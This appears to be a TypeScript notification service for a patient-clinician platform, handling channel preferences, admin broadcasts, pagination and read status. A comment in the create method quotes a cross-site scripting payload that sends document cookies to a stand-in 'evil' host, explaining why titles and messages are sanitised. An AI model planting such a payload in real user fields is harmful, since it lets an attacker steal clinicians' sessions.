import { prisma } from "../lib/prisma";
import { notifyUser } from "./realtime.service";
import { MailerService } from "./mailer.service";
import { PushService } from "./push.service";
import { sanitize } from "../utils/sanitize";



interface CreateNotificationInput {
    userId: number;
    title: string;
    message: string;
    type?: string;
    email?: boolean; // additionally send an email when the user enabled it for this category
}

export interface ChannelPrefs {
    inApp: boolean;
    email: boolean;
}
export type NotificationPrefs = Record<string, ChannelPrefs>;

export const DEFAULT_PREFS: NotificationPrefs = {
    appointment: { inApp: true, email: false },
    message: { inApp: true, email: false },
    system: { inApp: true, email: true },
};
const PREFS_TYPES = ["appointment", "message", "system"];

export const parsePrefs = (raw: string | null): NotificationPrefs => {
    const result: NotificationPrefs = JSON.parse(JSON.stringify(DEFAULT_PREFS));
    if (!raw) return result;
    try {
        const parsed = JSON.parse(raw);
        for (const type of PREFS_TYPES) {
            const v = parsed[type];
            if (v === undefined) continue;
            if (typeof v === "boolean") {
                // backward-compatible: old shape { appointment: bool } → inApp only
                result[type].inApp = v;
            } else if (typeof v === "object" && v !== null) {
                result[type].inApp = v.inApp !== false;
                result[type].email = v.email === true;
            }
        }
    } catch {
        // keep defaults
    }
    return result;
};

export class NotificationService {
    static async create(data: CreateNotificationInput) {
        const type = data.type || "system";
        const wantsEmail = data.email === true;

        let prefs: NotificationPrefs = { ...DEFAULT_PREFS };
        if (PREFS_TYPES.includes(type)) {
            const user = await prisma.user.findUnique({
                where: { id: data.userId },
                select: { notificationPrefs: true, email: true },
            });
            prefs = parsePrefs(user?.notificationPrefs ?? null);
            const recipientEmail = user?.email ?? null;

            // Channels are independent. The previous `if (!prefs[type].inApp)
            // return null;` sat *above* the email branch, so a patient who
            // turned off in-app notifications for appointments silently also
            // stopped receiving booking confirmations by email.
            if (!prefs[type].inApp && !(wantsEmail && prefs[type].email)) {
                return null;
            }

            if (wantsEmail && prefs[type].email && recipientEmail) {
                const { subject, html } = MailerService.buildNotificationEmail({
                    title: data.title,
                    message: data.message,
                    type,
                });
                MailerService.send(recipientEmail, subject, html).catch(() => {});
            }
        }

        if (!prefs[type]?.inApp) {
            // Email-only: the in-app row is suppressed, which is the point of
            // the channel being separate.
            return null;
        }

        // `title` and `message` are sanitised at this single choke point, which
        // every notification passes through, rather than at each of the 19 call
        // sites.
        //
        // The concrete attack this closes: `User.name` is free text with no
        // character restriction, so a patient can register as
        // `<img src=x onerror="fetch('//evil/'+document.cookie)">`. That name
        // reaches `support.controller`'s SOS alert text and
        // `message.service`'s "New message from ..." body, which were both
        // interpolated verbatim - and then rendered into a clinician's
        // authenticated session, in-app and over the realtime WebSocket.
        //
        // Every other free-text field in the codebase already went through
        // `sanitize()` - messages, reviews, care-plan text, appointment notes -
        // which is what makes this an oversight rather than a design choice.
        const title = sanitize(data.title);
        const message = sanitize(data.message);

        const notification = await prisma.notification.create({
            data: {
                userId: data.userId,
                title,
                message,
                type,
            },
        });

        // Live push via the Go realtime service (fire-and-forget)
        await notifyUser(data.userId, title, message, type);

        // Web push (when the user has subscribed a device)
        await PushService.send(data.userId, title, message, "/dashboard");

        return notification;
    }

    // Admin broadcast: one batched insert, then realtime + web push per user.
    // Emails are intentionally NOT sent (a broadcast must never mass-email).
    static async broadcast(rawTitle: string, rawMessage: string, type = "system") {
        // Same reasoning as `create`: the admin who types this is trusted, but a
        // broadcast is delivered to every user on the platform and is rendered
        // into each of their sessions, so it is sanitised once here rather than
        // trusted at the boundary.
        const title = sanitize(rawTitle);
        const message = sanitize(rawMessage);

        const users = await prisma.user.findMany({
            where: { isBanned: false },
            select: { id: true, notificationPrefs: true },
        });

        const recipients = users.filter((u) => {
            if (!PREFS_TYPES.includes(type)) return true;
            return parsePrefs(u.notificationPrefs)[type].inApp;
        });
        if (recipients.length === 0) return { recipients: 0 };

        await prisma.notification.createMany({
            data: recipients.map((u) => ({ userId: u.id, title, message, type })),
        });

        // Two problems with the original fan-out, both about scale rather than
        // correctness. `PushService.send` issues its own `pushSubscription`
        // query per recipient, so a broadcast to 10k users is 10k queries plus
        // up to 20k outbound HTTPS calls materialised as live promises in one
        // request. And it is all awaited inline, so a broadcast is a request
        // that takes minutes and times out halfway. Chunked, so the pool is not
        // exhausted and a slow provider cannot starve the rest.
        const CHUNK = 25;
        for (let i = 0; i < recipients.length; i += CHUNK) {
            const chunk = recipients.slice(i, i + CHUNK);
            await Promise.allSettled(
                chunk.flatMap((u) => [
                    notifyUser(u.id, title, message, type),
                    PushService.send(u.id, title, message, "/dashboard"),
                ])
            );
        }

        return { recipients: recipients.length };
    }

    static async getPreferences(userId: number) {
        const user = await prisma.user.findUnique({
            where: { id: userId },
            select: { notificationPrefs: true },
        });
        return parsePrefs(user?.notificationPrefs ?? null);
    }

    static async updatePreferences(userId: number, prefs: Partial<Record<string, unknown>>) {
        // Only the three known categories are persisted, and each is coerced to
        // the `{inApp, email}` shape, so a malformed payload can never write
        // junk that `parsePrefs` later has to defend against.
        const clean: NotificationPrefs = JSON.parse(JSON.stringify(DEFAULT_PREFS));
        for (const type of PREFS_TYPES) {
            const incoming = prefs?.[type];
            if (incoming === undefined) continue;
            if (typeof incoming === "boolean") {
                clean[type].inApp = incoming;
                continue;
            }
            if (typeof incoming === "object" && incoming !== null) {
                const v = incoming as Record<string, unknown>;
                if (typeof v.inApp === "boolean") clean[type].inApp = v.inApp;
                if (typeof v.email === "boolean") clean[type].email = v.email;
            }
        }
        await prisma.user.update({
            where: { id: userId },
            data: { notificationPrefs: JSON.stringify(clean) },
        });
        return clean;
    }

    static async getUserNotifications(userId: number, page = 1, limit = 20) {
        // Clamp once, then derive `skip` from the clamped page size. Computing
        // `skip` from an unclamped `limit` while `take` was clamped made page 2
        // of `?limit=100&page=2` start at row 100 and return 50 rows, so pages
        // were skipped and rows duplicated across boundaries.
        const take = Math.max(1, Math.min(limit, 30));
        const currentPage = Math.max(1, page);
        const skip = (currentPage - 1) * take;
        const [rows, total] = await Promise.all([
            prisma.notification.findMany({
                where: { userId },
                // A unique tiebreaker is required for stable paging: `createdAt`
                // alone collides at DATETIME(3) precision once concurrent
                // inserts share a millisecond, which shifts rows between pages.
                orderBy: [{ createdAt: "desc" }, { id: "desc" }],
                skip,
                take,
            }),
            prisma.notification.count({ where: { userId } }),
        ]);
        return { rows, total, page: currentPage, totalPages: Math.ceil(total / take) };
    }

    static async markAsRead(notificationId: number, userId: number) {
        return await prisma.notification.updateMany({
            where: { id: notificationId, userId },
            data: { isRead: true },
        });
    }

    static async markAllAsRead(userId: number) {
        return await prisma.notification.updateMany({
            where: { userId, isRead: false },
            data: { isRead: true },
        });
    }

    static async getUnreadCount(userId: number) {
        return await prisma.notification.count({
            where: { userId, isRead: false },
        });
    }
}
